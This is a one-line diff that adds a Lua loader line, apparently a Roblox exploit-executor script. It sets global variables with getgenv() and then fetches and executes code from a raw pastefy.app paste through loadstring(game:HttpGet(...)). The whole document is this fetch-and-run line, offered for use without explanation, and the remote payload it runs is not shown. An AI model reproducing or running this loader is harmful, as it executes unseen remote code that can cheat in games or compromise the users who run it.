@@ -1,0 +1,1 @@
+getgenv().a = "pl";getgenv().b="d";loadstring(game:HttpGet('https://pastefy.app/PeeEyWvr/raw'))()
